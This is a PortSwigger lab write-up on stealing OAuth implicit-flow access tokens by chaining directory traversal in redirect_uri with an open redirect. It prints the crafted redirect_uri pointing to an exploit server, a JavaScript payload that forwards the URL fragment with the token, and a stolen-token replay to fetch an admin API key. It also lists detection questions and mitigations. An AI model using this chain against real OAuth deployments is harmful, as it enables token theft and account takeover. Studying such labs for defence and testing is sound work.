# Lab 05 - Stealing OAuth Access Tokens via an Open Redirect

## Lab Information

**Difficulty:** Practitioner

**Category**

- OAuth
- Implicit Flow
- Open Redirect
- Access Token Theft
- Directory Traversal

---

# Lab Objective

Steal the administrator's OAuth access token using an open redirect on the client application.

Use the stolen token to retrieve the administrator's API key from the OAuth Resource Server.

---

# Vulnerability

The OAuth server correctly restricts the `redirect_uri` to the client application's domain.

However,

the client application contains:

- Directory Traversal
- Open Redirect

By chaining these together, an attacker can still redirect the OAuth response to an attacker-controlled server.

---

# Root Cause

OAuth trusts:

```
redirect_uri
```

↓

Client Application

↓

Open Redirect

↓

Attacker Server

Although the OAuth provider performs domain validation, it fails to consider that trusted pages may themselves redirect elsewhere.

---

# Attack Chain

```
Victim

↓

OAuth Authorization

↓

redirect_uri

↓

Directory Traversal

↓

Open Redirect

↓

Exploit Server

↓

Access Token Leaked
```

---

# Why It Works

The OAuth provider validates only:

```
https://target.com
```

It does **not** validate where pages inside that domain eventually redirect.

An attacker abuses an internal open redirect to escape the trusted domain.

---

# Burp Analysis

Capture:

```
GET /auth
```

Observe:

```
response_type=token
```

Meaning:

```
Implicit Flow
```

---

# Discovery Phase

Test:

```
redirect_uri
```

Direct external domains are rejected.

However:

```
/oauth-callback/../post
```

works.

Directory traversal bypasses the expected callback path.

---

# Second Discovery

Audit:

```
/post
```

Find:

```
/post/next?path=
```

Example:

```
GET /post/next?path=https://exploit-server.net
```

Response:

```
302 Redirect
```

This is an Open Redirect.

---

# Final redirect_uri

```
https://target.com/oauth-callback/../post/next?path=https://exploit-server.net/exploit
```

OAuth accepts it because:

```
Domain == Trusted
```

Later,

the application redirects:

```
Target

↓

Exploit Server
```

bringing the access token with it.

---

# Exploitation Steps

## Step 1

Login normally using OAuth.

```
wiener

peter
```

---

## Step 2

Capture:

```
GET /auth
```

---

## Step 3

Modify:

```
redirect_uri
```

to

```
/oauth-callback/../post
```

Verify directory traversal works.

---

## Step 4

Locate:

```
/post/next
```

Confirm:

```
path=

↓

Open Redirect
```

---

## Step 5

Build final OAuth URL.

```
OAuth

↓

Directory Traversal

↓

Open Redirect

↓

Exploit Server
```

---

## Step 6

Create exploit.

```html
<script>
if (!document.location.hash)
{
window.location =
'https://oauth-server.net/auth?...'
}
else
{
window.location='/?'+document.location.hash.substr(1)
}
</script>
```

The script:

1. Starts OAuth
2. Receives access token
3. Extracts URL fragment
4. Sends token to attacker

---

## Step 7

Deliver exploit.

Administrator opens page.

Access token arrives in exploit server logs.

Example:

```
access_token=eyJhb...
```

---

## Step 8

Replay token.

```
GET /me
Authorization:
Bearer STOLEN_TOKEN
```

OAuth Resource Server returns:

```json
{
  "username":"administrator",
  "apikey":"*************"
}
```

Submit API key.

Lab solved.

---

# Complete Attack Diagram

```
Victim

↓

OAuth Login

↓

Access Token

↓

Directory Traversal

↓

Open Redirect

↓

Exploit Server

↓

Access Token

↓

GET /me

↓

Admin API Key
```

---

# Why Implicit Flow Is Dangerous

Unlike Authorization Code Flow,

Implicit Flow returns:

```
Access Token

↓

Browser
```

Therefore:

- JavaScript
- Redirects
- URL Fragments

can all expose the token.

---

# Detection Checklist

Look for:

```
redirect_uri

↓

Directory Traversal

↓

Open Redirect

↓

response_type=token
```

Questions:

- Can callback paths be manipulated?
- Can trusted pages redirect externally?
- Does any page reflect `path=` or `next=`?
- Is the access token present in the URL fragment?

---

# Bug Bounty Methodology

Whenever OAuth uses:

```
response_type=token
```

Always search for:

- Open Redirects
- XSS
- HTML Injection
- postMessage gadgets
- Dangerous JavaScript
- Directory Traversal
- Client-side redirects

Any of these may leak the access token.

---

# Impact

```
Access Token Theft

↓

Sensitive Data Disclosure

↓

Account Takeover

↓

API Abuse
```

---

# Mitigation

- Avoid the Implicit Flow for new applications.
- Prefer the Authorization Code Flow with PKCE.
- Validate `redirect_uri` using exact allowlists.
- Eliminate open redirects.
- Prevent directory traversal.
- Never expose tokens through untrusted pages.

---

# Personal Learning

Even if an OAuth provider validates the domain in `redirect_uri`, vulnerabilities within trusted pages—such as open redirects or directory traversal—can still expose access tokens. Attackers often chain multiple lower-severity issues to achieve full account compromise.

---

# PortSwigger Skills Learned

- OAuth Implicit Flow
- Access Token Theft
- Directory Traversal
- Open Redirect Chaining
- URL Fragment Extraction
- Burp Repeater
- OAuth Resource Server Abuse